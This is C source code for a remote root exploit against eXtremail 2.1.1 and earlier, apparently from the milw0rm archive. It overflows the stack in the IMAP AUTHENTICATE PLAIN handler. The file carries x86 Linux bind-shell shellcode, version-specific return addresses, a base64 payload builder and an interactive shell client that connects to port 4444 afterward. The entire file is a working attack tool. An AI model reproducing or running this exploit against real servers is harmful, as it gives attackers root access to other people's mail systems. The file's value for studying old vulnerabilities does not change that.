/* extremail-v6.c
 *
 * Copyright (c) 2006 by <mu-b@digit-labs.org>
 *
 * eXtremail <=2.1.1 remote root exploit (x86-lnx)
 * by mu-b - Wed Oct 18 2006
 *
 * - Tested on: eXtremail 2.1.1 (lnx)
 *              eXtremail 2.1.0 (lnx)
 *
 * Stack overflow in ifParseAuthPlain
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2006!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define BUF_SIZE    2048
#define BBUF_SIZE   BUF_SIZE/3*4+1

#define NOP         0x41

#define AUTH_CMD    "1 AUTHENTICATE PLAIN\n"

#define DEF_PORT    143
#define PORT_IMAPD  DEF_PORT
#define PORT_SHELL  4444

static const char movshell_lnx[] =
  "\x8b\x44\x24\x08"        /* mov 0x08(%esp),%eax */
  "\x40"                    /* inc %eax */
  "\xff\xe0";               /* jmp *%eax */

static const char bndshell_lnx[] =
  "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
  "\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
  "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
  "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
  "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
  "\x89\xe1\xcd\x80";

#define NUM_TARGETS 2

struct target_t
{
  const char *name;
  const int len;
  const int zshell_pos;
  const char *zshell;
  const int fp_pos;
  const unsigned long fp;
};

/* fp = objdump -D smtpd | grep "ff e0" */
struct target_t targets[] = {
  {"Linux eXtremail 2.1.1 (tar.gz)",
   256, 1, bndshell_lnx, 140, 0x08216357}
  ,
  {"Linux eXtremail 2.1.0 (tar.gz)",
   256, 1, bndshell_lnx, 140, 0x08216377}
  ,
  {0}
};

static const char base64tab[] =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64 (const char *ibuf, char *obuf, size_t n);
static int sock_send (int sock, char *src, int len);
static int sock_recv (int sock, char *dst, int len);
static int sockami (char *host, int port);
static void shellami (int sock);
static void zbuffami (char *zbuf, struct target_t *trgt);

static int
base64 (const char *ibuf, char *obuf, size_t n)
{
  int a, b, c;
  int i, j;
  int d, e, f, g;

  a = b = c = 0;
  for (j = i = 0; i < n; i += 3)
    {
      a = (unsigned char) ibuf[i];
      b = i + 1 < n ? (unsigned char) ibuf[i + 1] : 0;
      c = i + 2 < n ? (unsigned char) ibuf[i + 2] : 0;

      d = base64tab[a >> 2];
      e = base64tab[((a & 3) << 4) | (b >> 4)];
      f = base64tab[((b & 15) << 2) | (c >> 6)];
      g = base64tab[c & 63];

      if (i + 1 >= n)
        f = '=';
      if (i + 2 >= n)
        g = '=';

      obuf[j++] = d, obuf[j++] = e;
      obuf[j++] = f, obuf[j++] = g;
    }

  obuf[j++] = '\n';
  obuf[j++] = '\0';

  return strlen (obuf);
}

static int
sock_send (int sock, char *src, int len)
{
  int sbytes;

  sbytes = send (sock, src, len, 0);

  return (sbytes);
}

static int
sock_recv (int sock, char *dst, int len)
{
  int rbytes;

  rbytes = recv (sock, dst, len, 0);
  if (rbytes >= 0)
    dst[rbytes] = '\0';

  return (rbytes);
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int sock;

  fflush (stdout);
  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket()");
      exit (-1);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (-1);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (sock, (struct sockaddr *) &address, sizeof (address)) == -1)
    {
      perror ("connect()");
      exit (EXIT_FAILURE);
    }

  return (sock);
}

static void
shellami (int sock)
{
  int n;
  fd_set rset;
  char recvbuf[1024], *cmd = "id; uname -a; uptime\n";

  sock_send (sock, cmd, strlen (cmd));

  while (1)
    {
      FD_ZERO (&rset);
      FD_SET (sock, &rset);
      FD_SET (STDIN_FILENO, &rset);
      select (sock + 1, &rset, NULL, NULL, NULL);
      if (FD_ISSET (sock, &rset))
        {
          if ((n = sock_recv (sock, recvbuf, sizeof (recvbuf) - 1)) <= 0)
            {
              fprintf (stderr, "Connection closed by foreign host.\n");
              exit (EXIT_SUCCESS);
            }
          printf ("%s", recvbuf);
        }
      if (FD_ISSET (STDIN_FILENO, &rset))
        {
          if ((n = read (STDIN_FILENO, recvbuf, sizeof (recvbuf) - 1)) > 0)
            {
              recvbuf[n] = '\0';
              sock_send (sock, recvbuf, n);
            }
        }
    }
}

static void
zbuffami (char *zbuf, struct target_t *trgt)
{
  int i;
  char *fill = "digitlabs";

  memset (zbuf, NOP, trgt->len);
  memcpy (zbuf + trgt->zshell_pos, trgt->zshell, strlen (trgt->zshell));

  zbuf[trgt->fp_pos + 1] = (u_char) (trgt->fp & 0x000000ff);
  zbuf[trgt->fp_pos + 1 + 1] = (u_char) ((trgt->fp & 0x0000ff00) >> 8);
  zbuf[trgt->fp_pos + 1 + 2] = (u_char) ((trgt->fp & 0x00ff0000) >> 16);
  zbuf[trgt->fp_pos + 1 + 3] = (u_char) ((trgt->fp & 0xff000000) >> 24);

  memcpy (zbuf + trgt->fp_pos + 1 + sizeof (u_long), movshell_lnx,
          strlen (movshell_lnx));

  /* rfc #2595 states "\x00<username>\x00<password>" */
  zbuf[0] = '\0';
  zbuf[trgt->fp_pos + 1 + sizeof (u_long) + strlen (movshell_lnx)] = '\0';

  for (i = trgt->fp_pos + 1 + sizeof (u_long) + strlen (movshell_lnx) + 1;
       i < trgt->len; i++)
    zbuf[i] = fill[i % strlen (fill)];
}

int
main (int argc, char **argv)
{
  int sock, rbytes;
  char zbuf[BUF_SIZE], sbuf[BBUF_SIZE];
  struct target_t *trgt;

  printf ("eXtremail <=2.1.1 remote root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if (argc <= 2)
    {
      fprintf (stderr, "Usage: %s <host> <target>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  if (atoi (argv[2]) >= NUM_TARGETS)
    {
      fprintf (stderr, "Only %d targets known!!\n", NUM_TARGETS);
      exit (EXIT_SUCCESS);
    }

  trgt = &targets[atoi (argv[2])];
  printf ("+Connecting to %s...", argv[1]);
  sock = sockami (argv[1], PORT_IMAPD);
  rbytes = sock_recv (sock, zbuf, sizeof (zbuf) - 1);
  if (rbytes < 0)
    exit (EXIT_SUCCESS);
  printf ("  connected\n");

  printf ("fp: 0x%x\n", (int) trgt->fp);
  printf ("buf len: %d\n", trgt->len);

  printf ("+Building buffer with shellcode...");
  memset (zbuf, 0x00, sizeof (zbuf));
  zbuffami (zbuf, trgt);
  printf ("  done\n");

  printf ("+Building base64 encoded buffer...");
  base64 (zbuf, sbuf, trgt->len);
  printf ("  done\n");

#ifdef DEBUG
  sleep (15);
#endif

  printf ("+Making request...");
  sock_send (sock, AUTH_CMD, strlen (AUTH_CMD));
  rbytes = sock_recv (sock, zbuf, sizeof (zbuf) - 1);
  if (rbytes < 0)
    exit (EXIT_SUCCESS);

  sock_send (sock, sbuf, strlen (sbuf));
  printf ("  done\n");

  printf ("+Waiting for the shellcode to be executed...\n");
  sleep (1);
  sock = sockami (argv[1], PORT_SHELL);
  printf ("+Wh00t!\n\n");
  shellami (sock);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-10-15]
